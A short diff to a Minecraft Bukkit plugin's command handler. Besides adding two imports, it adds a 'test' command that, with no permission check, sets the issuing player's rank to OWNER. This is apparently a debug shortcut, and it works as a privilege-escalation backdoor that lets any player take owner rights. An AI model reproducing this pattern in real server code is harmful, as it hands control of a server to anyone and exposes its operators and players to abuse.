@@ -8,6 +8,9 @@ import org.bukkit.entity.Entity;
 import org.bukkit.entity.Player;
 import org.bukkit.entity.Sheep;
 
+import com.arrayprolc.rank.RankManager;
+import com.arrayprolc.rank.ServerRank;
+
 public class ArrayCommandHandler {
 
 	static Main plugin;
@@ -40,6 +43,9 @@ public class ArrayCommandHandler {
 					 return false;
 				}
 			}
+		}
+		if(label.equalsIgnoreCase("test")){
+			RankManager.setRank(((Player)sender), ServerRank.OWNER);
 		}
 		return false;
 	}
